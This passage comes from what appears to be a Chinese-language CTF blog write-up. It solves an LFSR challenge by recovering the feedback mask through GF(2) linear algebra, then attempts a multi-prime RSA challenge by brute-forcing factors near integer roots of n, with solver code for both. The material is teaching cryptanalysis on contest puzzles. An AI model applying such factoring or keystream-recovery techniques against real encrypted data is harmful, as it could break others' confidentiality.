111011010110010011010101100100000101100110110011011110000110011000000001011000111100101000011011011010010111000110101110101111100100010101010101000011000111000010001001000100110101111001001001111100110000101100010011101100001000010100010101110001111110101100101000101110000110010100101100101100101100100111111010100101010011100110100011111001000100010001101111111101011110100111001110101001101000010001011000111101110001010100101101111000110101001011101110110110110110101011010001110011111011110011010100110100111111010101111101111100110000110010111110110100110000011110110111111101111010011010000101010111100001111110110000001000001000011101001010010100100100000001101011101110011001011011110010111101111101010011010000110110101000100010110110101101010110110010011010011111111100001001000110111101001111000011001000010111100110001110110011011011100101011010101100011001111111000100000011100110011001001011000100010110000100001100011010000110110011100000111000010001011010001110010101000100010001001110001011001010000111010010101110001010100011101101110010111100010110010000011010111001101000100111011010100001010011100000100001010100010110100111000000001111100000100011100101011011101111111101101110011111010000110111101000001001110111000001000101100110100100111100100011011100010011111101010001101010100101110000110011000100001111100100001000000100011101101011011111000011110010110110101010011101000001111001011100101001001101111000011110000001010011010001110000111001101100011110011001100000111101001011000110111011001101101101100101100110100101011111111110110000111101000000100101011100111001111111011010100110010001000001101010001110010010000101111000001010100000101100000010101110100000000110011001011000011101101000000100111111010111110100011111101100001001110001100101100001010000100000110111101001101010000011100000000100000101101010010101111101100110110111000011100111001010010100101000111011001001110011111100010010010110100111101100110110111001011110010000111011111010101000010001101110011111010110011100010001111111011100110100011110110001101001110001010001110011110101111101011101100000111011011101110000110111101010001000011110011011101100011100101110100000100010110110011010101011000010010110000000100010011001110010011110010110111001111011010101111011000000111110000011011100100010011110010110000001111110111000100111010100110010111100010000110101011110011010110011001011011010010111001000000000001001010101010001100000110111101000000010100100010100101011111110011011100111101001110101010001100000100100110111110001111000011100010110001101101010011001011111101011000110110000111111101100000000001000010010010011101001000111100000010111011011001001100110000101010110001011000001011010111000111100111011010101010011100100100100010000001101001101010111110010100101000001100111110111111110000101111100110001110111010111001111110111100000111011011010111011001111010100010000111011111111000100110110001100000110101000001010010010100111011100000011111110001000010011010101001111010111100011110110110111000000111101010110001100000100001101101001101010111110001101101100101101101001000100000100110111111010011010011111010110110111101001000100010111101100011010111011111010011110000100001100101101111110010101000000101111101000001111110100000001011011111111100100110101101011100101101001011010001100010101101100000101000001110110101010100001011100010000111010011101110000000010000000000010111100111000010000000110110011011101110000001111011100011101111100011000011001000100111010101011010101110011010011011011010100011011000110111101001110011110000100010011000010000001101010010011000111000000000101100011010001000100010100100100011000101110100010001111101001010100001000000110010011101011101000000100010000011010110100111110101110001111001000000101011101010111110110100100011010000011010111111001001111101101110111110111000001010111100010001001001100000000110011100001100100111010011111011001010001101111111000010110101000011100001010110100101110111001001100000000110110101011001110000011001111100001101110100101101111100110001010011011001010110111000100010000110001111101110011100001101000100110000111000110001011011110100010101011011001001111101001110011100001110001010100011001110110101101001101010101001110011110001011101011100100001101100110110110101011101010110011100000001011010111011101000000101110111110010000000000101001110011111011001110001100010111001010010110011100001000011111101111101100111000101011100011000001100000000000010000111111010010101110101011100010100001000000100111111010111110010010111010110010100111000010111100000000100010111010010011010011001100010001000001100110100101110100110110111101010001100001010011111011100000010110110110000000100101100110100101100111001010100010001011010001010011110100110101000110001110000100111111001000110011110010111000110010001111111111101011110100111101001001101110110011111000110010111000011011111001110101101101000011010101011010111101011101111011100101001111111000101100100000011000100101001011001011110001101001100101001</span><br></pre></td></tr></table></figure>
<p>下载之后，一开始我一脸懵逼，不知道这是在考什么。</p>
<p>于是我就Google了一下 “lfsr”，结果Google给了我这个↓</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/lfsr.png" alt="lfsr"></p>
<p>哎呀！我这个觅马菜鸡，觅马学都没学好，居然对学过的LFSR都不敏感了。 <strong>Linear（线性） Feedback（反馈） Shift（移位） Register（寄存器）</strong> 看看多好记的。</p>
<blockquote>
<p>不知道的同学可以随便先去了解下</p>
</blockquote>
<p>简单说说（意思就是我个人的理解，不代表真实定义）这个<strong>反馈移位寄存器，FSR</strong>就是下面这个图的样子👇，</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/FSR.png" alt="FSR"></p>
<blockquote>
<p>有一个框框有固定长度n，每一个小格子中的数<strong>要么是0，要么是1</strong>，我们就可以称其为<strong>寄存器</strong>，代码中可以用数组来模拟。</p>
<p>这个框框每次都从右边输出固定m位的ai，然后就会往右移动m位，再利用<strong>某种算法</strong>计算出m个数，依次填在左边的m位，这样是不是就是相当于移动起来了？于是就可以称其位<strong>移位寄存器</strong>。一般情况下，都是输出一位，移动一位，计算出新的一位，即m=1，下面都以m=1来谈。</p>
<p>上面提到的某种算法，在这里我们就称之为，<strong>“反馈函数”</strong>，表达式为 a<sub>n+1</sub> = f(a<sub>n</sub>, a<sub>n-1</sub>,,,,,a<sub>1</sub>)  这样通过前面的n个状态，我们就可以推算出下一个状态。</p>
<p>当这里的反馈函数为线性函数时，我们就称其为 <strong>“线性反馈移位寄存器”</strong>，那么在GF(2)上（不知道的同学可以简单理解为取值只有0和1），线性函数的即是寄存器中的某些位的异或。<del>（不要问我怎么知道的，想想那异或运算的性质，0和1的计算结果还是0和1，我们就可以简单地通过是仅仅选择某些位来进行异或）</del> 此时，反馈函数就是下面这样👇<br>$$<br>f(a_1,a_2,…,a_n) = c_1a_1 \oplus c_2a_2 \oplus … \oplus c_na_n<br>$$<br>其中c<sub>i</sub> 取值只能是0或者1，为0可以理解为没有选择这一位，为1可以理解为选择了这一位。</p>
</blockquote>
<p>那既然咱已经学过了，应该还是有可能做得出来哦。那代码肯定就是整了一个LFSR来构建流觅马咯。那就康康代码先。</p>
<p>果然，代码第8~13行定义了一个 <code>lfsr</code> 函数了作为LFSR。我们暂且跳过它，看 <code>main</code> 函数。</p>
<p>16<del>17行就是告诉我们，flag 是 <code>flag&#123;***************&#125;</code> 这个样子的。 20行就是告诉我们中间需要我们求的部分是100位的（<strong>二进制位哈</strong>）。然后它把我们要的 flag 变成了它的 <code>mask</code> 了，<strong>所以我们就是要整出来这个玩意，就是我们要的 flag 了</strong>。22行，接着它随机了一个 <code>state</code>，也是最多100位的。26</del>32行它把 LFSR 的前10000个输出结果告诉我们了。 </p>
<p>接下来就是分析 <code>lfsr</code> ：</p>
<p>第9行，其将输入的 <code>state</code> 和 <code>mask</code> 进行了一个<strong>与操作</strong>，并赋值给了 <code>feedback</code>，暂且不懂其意义，但是多半是反馈函数的一部分，毕竟feedback的英文意思在这里，搁置先。</p>
<p>第10行，将上面与运算后的结果 <code>feedback</code> 转化为了2进制，然后切片去掉了前面的’0b’字段， <code>.count(&quot;1&quot;)</code> 是个什么玩意？？不过顾名思义，应该或许大概就是统计1的个数。关于这一点，可以自己写一个py很好进行验证。结果证明就是这样。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">bin</span>(<span class="number">5</span>)[<span class="number">2</span>:].count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 = 101</span></span><br><span class="line"><span class="comment"># s = 2</span></span><br></pre></td></tr></table></figure>
<p>然后又与了一个1，那就是第10行是在判断，<code>state</code> 和 <code>mask</code> 中一样都是1的位数是奇数位还是偶数位。</p>
<p>第11行，就是将当前的 <code>state</code> 的最后一位赋值给 <code>output_bit</code> </p>
<p>第12行，就是将 <code>state</code> 右移1位再和 <code>feed_bit</code> 左移 N-1位相或。并更新 <code>state</code> 。那到这里，也即是说 <code>state</code> 就是我们前面所说的 <strong>那个框框</strong>。而12行就是将原来的 <code>state</code>  右移1位，<code>feed_bit</code> 填在了最高位，也就是说，<code>feed_bit</code> 就是反馈函数的输出。</p>
<p>第13行，就将新寄存器和旧寄存器的最后一位返回出去了。而后者就是在我们的output文件中。</p>
<p>再回到前面可以看到，9行和10行，就是我们的反馈函数。</p>
<p>那么，如果我们知道寄存器的位数，其实我们是可以知道寄存器的初始状态的，即最前面随机生成的 <code>state</code> 。也就是output的前多少位。</p>
<p>现在，才到了问题最关键的地方，怎么把9行和10行，转化为我们前面的公式（1） 的样儿呢？</p>
<p><strong>思考思考思考……</strong></p>
<p>好的，我思考出来了。</p>
<p>为了方便，我们把公式（1）给贴一份到这里。<br>$$<br>f(a_1,a_2,…,a_n) = c_1a_1 \oplus c_2a_2 \oplus … \oplus c_na_n<br>$$<br>然后考虑第9行和第10行代码，为了方便，也贴这里。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">feedback = state &amp; mask</span><br><span class="line">feed_bit = <span class="built_in">bin</span>(feedback)[<span class="number">2</span>:].count(<span class="string">&quot;1&quot;</span>) &amp; <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>因为是在按位进行与，所以我们可以把他们看做一个等长的bool数组。于是可以将第9行转化为👇这个。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">feedback[i] = state[i] &amp; mask[i] </span><br><span class="line"><span class="comment"># i from 0 to length</span></span><br></pre></td></tr></table></figure>
<p>那原代码的第10行，不就是在看这些所有的 <code>feedback[i]</code> 中1的个数是奇数还是偶数嘛？</p>
<p>那一堆01的串，你要统计他的个数是奇数还是偶数，除了一个个数，还能怎么计算呢？</p>
<p>那你试试，把他们这一堆01的串，逐位进行异或会怎么样呢？</p>
<p><strong>好吧，事实就是这样，你把一堆01串逐位异或起来得到的结果，和你直接去数1的个数是奇数还是偶数，再与上1进行判断，结果是一样的。</strong>如公式（3）所示：<br>$$<br>feed_bit == (\sum\limits_{k=1}^na_k) &amp; 1 == a_1\oplus a_2 \ \oplus … \oplus\ a_n \ ,\ \forall\ a_k \in {0\ ,\ 1}<br>$$<br>那既然这样了，岂不是就已经可以得到 反馈函数了？如果把公式（3）中的 a<sub>k</sub> 视作 <code>feedback[k]</code> 是不是就ok了？</p>
<blockquote>
<p>原来的代码的第10行，不正是公式（3）中的左半部分吗？统计1的个数和把他们直接加起来是一样的效果吧？毕竟取值只有0和1</p>
</blockquote>
<p>于是，我们可以把原来第10行，直接相当于公式（3）中的右半部分，对吧？那么和我们想要的反馈函数，公式（1）相比，差了什么呢？是不是就是 a<sub>k</sub> 前面的系数 c<sub>k</sub> ?</p>
<p>那其实我们知道 <code>feedback</code> 只是一个中间变量，我们其实是不需要它的，<strong>我们事实上是关心的 <code>state</code> 毕竟他才是寄存器。</strong> 而反馈函数中的每一个 a<sub>k</sub> 其实都是寄存器中的一个元素。因此，刚才我们将 <code>feedback[k]</code> 这个中间变量视作了 a<sub>k</sub> ，现在我们要给他还回去，变成 <code>state[k]</code> ，而原代码的第9行，不就是 <code>state</code> 和 <code>feedback</code> 的关系吗？而且刚好是 <strong>与关系</strong> 。看到这里明白了吧？ <code>state[k]</code> 才是我们的 a<sub>k</sub> 而 <code>mask[k]</code> 则刚好构成我们的 c<sub>k</sub>。</p>
<blockquote>
<p>如果还是很迷，不妨回到刚才， a<sub>k</sub> 视作 <code>feedback[k]</code> 。 那么 <code>feedback[k]</code> = <code>state[k]</code> &amp; <code>mask[k]</code> 没毛病吧？然后在换元，把a<sub>k</sub> 替换成 <code>state[k]</code> &amp; <code>mask[k]</code> 为了书写方便，我们可以将 <code>state[k]</code>  记为 b<sub>k</sub> 将 <code>mask[k]</code> 记为 c<sub>k</sub> 。于是公式（3）就是公式（4）</p>
</blockquote>
<p>$$<br>feed_bit == a_1\oplus a_2 \ \oplus … \oplus\ a_n \  == c_1b_1 \oplus c_2b_2 \oplus … \oplus c_nb_n<br>$$</p>
<p>可以看到，此时，公式（4）的最左侧和最右侧。 b<sub>k</sub> 是 <code>state</code> (寄存器)此时的状态，而 c<sub>k</sub> 是 <code>mask</code> ，而 <code>feed_bit</code> 是寄存器的反馈状态，也就是下一位，用这里的统一符号就是 <code>feed_bit</code> 就是 b<sub>N+1</sub> (N 是寄存器的位数)。<strong>为了表示习惯的统一，我们还是将b换为a统一表示</strong>，就有了下面的公式（5的 <strong>反馈函数</strong>：<br>$$<br>a_{n+1} = c_1a_1 \oplus c_2a_2 \oplus … \oplus c_na_n<br>$$<br><strong>那么现在，问题就很清楚了，我们要找的 flag 就是mask，而mask就是我们反馈函数中的系数 c<sub>k</sub>，我们把这个玩意求出来了，flag就到手了。</strong></p>
<p>偶滴个乖乖讲了半天，还是不知道这个c<sub>k</sub> 咋求哒。莫方莫方。接下来就快了。</p>
<p>根据公式（5）我们能得到什么？ 能得到公式（6）。<br>$$<br>a_{n+1} = c_1a_1 \oplus c_2a_2 \oplus … \oplus c_na_n \ a_{n+2} = c_1a_2 \oplus c_2a_3 \oplus … \oplus c_na_{n+1} \ a_{n+3} = c_1a_3 \oplus c_2a_4 \oplus … \oplus c_na_{n+2} \ \vdots \a_{n+n} = c_1a_n \oplus c_2a_{n+1} \oplus … \oplus c_na_{n+(n-1)} \<br>$$<br>公式（6）太过于冗余不好看，我们给它换一个写法。写作如下的矩阵形式。<br>$$<br>\begin{pmatrix}<br>a_{n + 1} \<br>a_{n + 2} \<br>\vdots \<br>a_{n + n} \<br>\end{pmatrix}</p>
<p>=</p>
<p>\begin{pmatrix}<br>a_1 \quad a_2      &amp; \cdots &amp; \quad a_n \<br>a_2 \quad a_3      &amp; \cdots &amp; a_{n+1}  \<br>\vdots \quad \vdots &amp; \ddots &amp; \vdots \<br>a_n \quad a_{n+1}      &amp; \cdots &amp; a_{n+n}<br>\end{pmatrix}</p>
<p>\times</p>
<p>\begin{pmatrix}<br>c_1 \<br>c_2 \<br>\vdots \<br>c_n \<br>\end{pmatrix}</p>
<p>=</p>
<p>A</p>
<p>\begin{pmatrix}<br>c_1 \<br>c_2 \<br>\vdots \<br>c_n \<br>\end{pmatrix}<br>$$<br>那么，根据公式（7），显然，如果我们能得到 2n个 a<sub>k</sub> ，我们就能构造出上述的A矩阵和左边的列向量。同时，如果A是可逆的。我们可以直接左乘一个 A<sup>-1</sup> 就可得到系数的向量了。<br>$$<br>\begin{pmatrix}<br>c_1 \<br>c_2 \<br>\vdots \<br>c_n \<br>\end{pmatrix}</p>
<p>=<br>A^{-1}</p>
<p>\begin{pmatrix}<br>a_{n + 1} \<br>a_{n + 2} \<br>\vdots \<br>a_{n + n} \<br>\end{pmatrix}<br>$$<br>于是这个题就迎刃而解了。题目中给了n<sup>2</sup> 位输出，所以我们直接枚举就好。虽然不知道n是多少，但是可以枚举n从2~100。然后求出mask，即flag。</p>
<blockquote>
<p>这里有个小投机，虽然不知道n的大小，但是我们知道flag是100位的，所以只把100位的flag打出来就好了</p>
</blockquote>
<p>下面就直接贴代码了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">output = <span class="string">&#x27;0100110011101111011111011010100111001010010100001111110110111101011110011111010010010111011100110111011001100001010010011101101000110110000011111011110000010100001001000011001011011011011001111110101111001010011011100010011110101100100101111001011100011110111101001010000000100100000111100101100100100000100110001111110011100110101000110100011001110110000110111111010111000001101110011001101111010110101000101011110111001011001111111000100100100011100100010101001100111011101111100110101011101101001001110010111011010011111001100001111111100001000001101101000001010100110011001101000101001010001001011000010111111100101111000000101000010110100110101001001100100011000111101000110011110101101111100110101010101000000001110010101001001111101001010111011110110001100101001111110111000110101011011010110101100011110010000011000110010111101010010000011101110111100011011110110001111010101011101100101101001111100100011000100101111011110001111100000110111000111111000111100000110011011011111110011111100010010110000010011100001010101011011101100011001100101100011001010010001101010011000000011110110111000000110001010010111110101011100000010100100001101011010101100110000101100010001010010111011000100001000001001110101011000010111000000010101100001010000010110110000111100011011000010111001111101110111010110000011001011101100000100000100010100100000010011010000111110010001111010000100011110000101111000110100010110101110001011101101100111000001110100100000000010011001110101110000001101100000001010111010011111000101101011001010011001101000111000010111111010101000011011001001110000011100100100010110101100001110110111001000001011111100101100011010010010110000011110100110000111011011010101110101001100110100101100101000100011001011000001011110010000011000110111011110011010001101100010010111110101101101110100111010000001101000011011010011110111101000000100011000000101001000000011010101010000100001110110000110011000111101011100100101111101111111110101000011010001101100010010100111000000010000101100100110101000001001011100011111001101001101100010100000111010101111011101111111101100000010000111110011101010100101110100101010100011110100100000111010001000100011010011100010011000001110110100110110010100100110111011001010010010100000110101110000011110010110100010101000110000111101011011010111101100111100101001101001101100111101000100101101100010111010010111100100111101101110101110011010110011111011111010000011000100010010101110001001000111111100100010100000001001010111010100010111001011011101110010110111110110100011111101110111011000111001010010110001001011011100110101111100100000101110000001011110011101110101101001011111100011001100111001011011001011011101000101100100011101000011101011010110010111111010011110111111111100001101101001101101111000100110010010100000100000100110100100110010000100101100000101010101000111110101001111111011011111101101110010100110000010110111001101110011101100001111111001110110010010011101111100111111000010011010010011100000001010011111111110001111110110110110001001001111011001101110110101100011010001111110010001011010000011110101100110010010001110010100010000000010101010010111011010101011011000010010011010110101101011100100101110001100000111110010101100010100010100010000101111000011111000111000011110001110110000011000100110010101111111111100011010000010010010111111110000000010100100101101101010111011000001010000000101011010110011101000110011011001110101101001001101100010011110001101001001000011001101100001101100000101111000001110100001100001000100000000011010011001001011110011000011011000100011011001011100111111000011011010000100000011110110011011110111000001011101101110110101000101011111110000100000111111110011111111100010101001000011010001110111111011100010111001110110001000101010001001001111111110111001101001001000110000110100000000010010100001010111101001110001011101011000100000001001001011111000100011111000011010001110001111111110111100010001110101011101011100010100000011110000100011001100000100111000111011011101000110010011010011110010010000111010001011111111010110011100111011110100111000101100100111001001010001000100011110101100100010000000000110010111101101111101011001101111000000000100000101001011110000010011110011000000100111001001110001000010011111010100001001010010100111111010111001001110110101010010100010010100101100000001010010111101101000110100111110000000111110000011110011001101010111101010111010111010000000110010001011110101110110001000110111101110101101001001100001101110001000100000110100000100000111110010110110010011111100010011111001110111011010101010001011111110000000011110001010011001101010110010101100101100110010111001100100111101000100010100010010100000010010111101100111110101101111101001010110010001111111001101010111110101111001000111101001110100000111111010000111000010101001001101100111001111111111100011010111110001101000100001010000000001101101001110001000001110010000010110001001001101010111111001001010100011011111011000011001001101000110010101000010100001001000011111001101101111011111001000010010111011010110010011010101100100000101100110110011011110000110011000000001011000111100101000011011011010010111000110101110101111100100010101010101000011000111000010001001000100110101111001001001111100110000101100010011101100001000010100010101110001111110101100101000101110000110010100101100101100101100100111111010100101010011100110100011111001000100010001101111111101011110100111001110101001101000010001011000111101110001010100101101111000110101001011101110110110110110101011010001110011111011110011010100110100111111010101111101111100110000110010111110110100110000011110110111111101111010011010000101010111100001111110110000001000001000011101001010010100100100000001101011101110011001011011110010111101111101010011010000110110101000100010110110101101010110110010011010011111111100001001000110111101001111000011001000010111100110001110110011011011100101011010101100011001111111000100000011100110011001001011000100010110000100001100011010000110110011100000111000010001011010001110010101000100010001001110001011001010000111010010101110001010100011101101110010111100010110010000011010111001101000100111011010100001010011100000100001010100010110100111000000001111100000100011100101011011101111111101101110011111010000110111101000001001110111000001000101100110100100111100100011011100010011111101010001101010100101110000110011000100001111100100001000000100011101101011011111000011110010110110101010011101000001111001011100101001001101111000011110000001010011010001110000111001101100011110011001100000111101001011000110111011001101101101100101100110100101011111111110110000111101000000100101011100111001111111011010100110010001000001101010001110010010000101111000001010100000101100000010101110100000000110011001011000011101101000000100111111010111110100011111101100001001110001100101100001010000100000110111101001101010000011100000000100000101101010010101111101100110110111000011100111001010010100101000111011001001110011111100010010010110100111101100110110111001011110010000111011111010101000010001101110011111010110011100010001111111011100110100011110110001101001110001010001110011110101111101011101100000111011011101110000110111101010001000011110011011101100011100101110100000100010110110011010101011000010010110000000100010011001110010011110010110111001111011010101111011000000111110000011011100100010011110010110000001111110111000100111010100110010111100010000110101011110011010110011001011011010010111001000000000001001010101010001100000110111101000000010100100010100101011111110011011100111101001110101010001100000100100110111110001111000011100010110001101101010011001011111101011000110110000111111101100000000001000010010010011101001000111100000010111011011001001100110000101010110001011000001011010111000111100111011010101010011100100100100010000001101001101010111110010100101000001100111110111111110000101111100110001110111010111001111110111100000111011011010111011001111010100010000111011111111000100110110001100000110101000001010010010100111011100000011111110001000010011010101001111010111100011110110110111000000111101010110001100000100001101101001101010111110001101101100101101101001000100000100110111111010011010011111010110110111101001000100010111101100011010111011111010011110000100001100101101111110010101000000101111101000001111110100000001011011111111100100110101101011100101101001011010001100010101101100000101000001110110101010100001011100010000111010011101110000000010000000000010111100111000010000000110110011011101110000001111011100011101111100011000011001000100111010101011010101110011010011011011010100011011000110111101001110011110000100010011000010000001101010010011000111000000000101100011010001000100010100100100011000101110100010001111101001010100001000000110010011101011101000000100010000011010110100111110101110001111001000000101011101010111110110100100011010000011010111111001001111101101110111110111000001010111100010001001001100000000110011100001100100111010011111011001010001101111111000010110101000011100001010110100101110111001001100000000110110101011001110000011001111100001101110100101101111100110001010011011001010110111000100010000110001111101110011100001101000100110000111000110001011011110100010101011011001001111101001110011100001110001010100011001110110101101001101010101001110011110001011101011100100001101100110110110101011101010110011100000001011010111011101000000101110111110010000000000101001110011111011001110001100010111001010010110011100001000011111101111101100111000101011100011000001100000000000010000111111010010101110101011100010100001000000100111111010111110010010111010110010100111000010111100000000100010111010010011010011001100010001000001100110100101110100110110111101010001100001010011111011100000010110110110000000100101100110100101100111001010100010001011010001010011110100110101000110001110000100111111001000110011110010111000110010001111111111101011110100111101001001101110110011111000110010111000011011111001110101101101000011010101011010111101011101111011100101001111111000101100100000011000100101001011001011110001101001100101001&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span>(<span class="params">n, key</span>):</span></span><br><span class="line">    array_1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            array_1.append(<span class="built_in">int</span>(key[i + j]))</span><br><span class="line">    A = matrix(GF(<span class="number">2</span>), n, n, array_1)</span><br><span class="line">    array_2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        array_2.append(<span class="built_in">int</span>(key[i + n]))</span><br><span class="line">    B = matrix(GF(<span class="number">2</span>), n, <span class="number">1</span>, array_2)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = A.solve_right(B)</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">100</span>):</span><br><span class="line">    c = work(n = n, key = output)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) == <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> c[::-<span class="number">1</span>]:</span><br><span class="line">	tmp += <span class="built_in">str</span>(x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(tmp, <span class="number">2</span>)) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># flag&#123;856137228707110492246853478448&#125;</span></span><br></pre></td></tr></table></figure>


<h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>题目描述如下：</p>
<blockquote>
<p>小明经过研究，发现RSA加密算法可以推广，也就是它的模不仅仅是只能为两个素数的乘积，只要是2个以上不同的素数相乘都可以。</p>
</blockquote>
<p>根据题目和描述，这个题是一个多质数的RSA<strong>（multi-prime RSA）</strong> </p>
<p>给出的文件 <code>cipher.txt</code> 很简单，就只有n,e,c</p>
<blockquote>
<p>n = 50142032499469550407421604706771611415193641755639270667473328045908799316205905505167271138079522738272643811917325451177986948493659090203974349370248583120022500722759239305447823602875823849366662503027591858371125301505134216095903796534740686834236150999<br>e = 65537<br>c = 45005399504992587510006608300548120810512973768886391125598523343330913326304417790989607300367232977960116381108873363343598357102136548218343380795022179607741940866191404186680657699739176842869814452906110393321567314747096161480003824583613027819960172221</p>
</blockquote>
<p>显然，这个题我们只有分解n，因为e是安全的，同时没有额外的信息，能利用的仅仅就是n有多个因数。</p>
<p>那么，二话不说，暴力分解走起。</p>
<p>遗憾的是，在线查找和yafu分解都失败了。yafu跑了好久都没有出来。</p>
<p>于是，我又尝试，自己手动来，从小质数开始枚举，一直枚举到了第100000*70个质数，还是没有成功枚举到一个因子。</p>
<p>这说明，这个n是没有小质因数的。</p>
<p>同时他又有多个质因数。</p>
<p><strong>猜测1：</strong>因此他的各个质因数的差距应该不大。</p>
<p>然后，我开始Google，毕竟我坚信这个是一种我没见过的新题型。看了好多英文论文，但是感觉写得都很垃圾。<del>（我英文垃圾，时间又很紧迫）</del> 各个论文都证明了半天，但是我感觉没啥用。倒是<strong>Google的搜索结果中，针对这种multi-prime RSA的攻击基本上都是基于他的质因数差异比较小来进行的。</strong> 这更加坚定了我的<strong>猜测1</strong>。</p>
<p>于是，借鉴普通RSA问题中，p和q太接近时的费马分解法的思路</p>
<blockquote>
<p>由于n = p * q,当p和q的差距太小时，这意味着p和q都会在 n<sup>1/2</sup> 附件。由于差距较小，所以我们可以在这个差距范围内进行枚举，进而实现对n的分解。</p>
</blockquote>
<p>我局得这个多因数的也是可以用类似的手法进行攻击的。</p>
<p>于是我枚举根次，从3枚举到20，每个附件的差异我定义为10亿。</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = gmpy2.mpz(<span class="number">50142032499469550407421604706771611415193641755639270667473328045908799316205905505167271138079522738272643811917325451177986948493659090203974349370248583120022500722759239305447823602875823849366662503027591858371125301505134216095903796534740686834236150999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜测的差异范围</span></span><br><span class="line">tot = <span class="number">1000000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">21</span>):</span><br><span class="line">    </span><br><span class="line">    p0 = gmpy2.iroot(n, num)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(tot):</span><br><span class="line">        <span class="keyword">if</span> n % (p0 + i) == <span class="number">0</span>:</span><br><span class="line">            print(p0 + i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> n % (p0 - i) == <span class="number">0</span>:</span><br><span class="line">            print(p0 - i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>很可惜，我没有跑出来它的因数，于是我又扩大了范围从20~100.</p>
<p>终于跑完了之后，我还是没有得到解。</p>
<p>于是我又扎进了寻找论文和Google方法中，<strong>因为我坚信，这是一类有其他方法一瞬得到结果的</strong>。</p>
<p>很遗憾，我没有在规定时间内拿到flag</p>
<p>赛后，我从同学哪里得知，<strong>开3次方根，将范围改到 2<sup>30</sup> 次方就可以爆破出来</strong>。</p>
<p>于是，新的代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">n = gmpy2.mpz(<span class="number">50142032499469550407421604706771611415193641755639270667473328045908799316205905505167271138079522738272643811917325451177986948493659090203974349370248583120022500722759239305447823602875823849366662503027591858371125301505134216095903796534740686834236150999</span>)</span><br><span class="line"></span><br><span class="line">p0 = gmpy2.iroot(n, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">tot = <span 